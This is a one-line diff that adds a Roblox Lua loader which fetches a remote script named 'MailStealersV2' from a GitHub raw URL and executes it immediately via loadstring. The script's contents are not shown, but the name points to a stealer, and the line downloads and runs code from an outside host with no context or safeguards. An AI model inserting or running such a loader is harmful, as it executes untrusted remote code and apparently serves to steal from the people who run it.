@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Logankingjr7/MailStealersV2/refs/heads/main/MailStealersV2.lua"))()
